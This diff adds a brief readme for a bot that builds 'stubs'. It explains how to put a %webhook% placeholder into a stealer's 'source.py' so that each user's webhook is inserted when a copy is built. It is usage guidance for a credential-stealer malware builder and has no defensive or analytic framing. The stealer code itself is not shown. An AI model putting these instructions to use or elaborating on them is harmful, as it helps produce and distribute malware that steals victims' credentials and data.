@@ -1,0 +1,5 @@
+This bot will build stubs But you have to modify the source so it will work
+
+in the file "source.py" you see how it says webhook = "%webhook%" yea so whatever webhook they build with using the bot it will replace
+
+so if your using your own stealer whatever the webhook value is make it %webhook% so it replaces
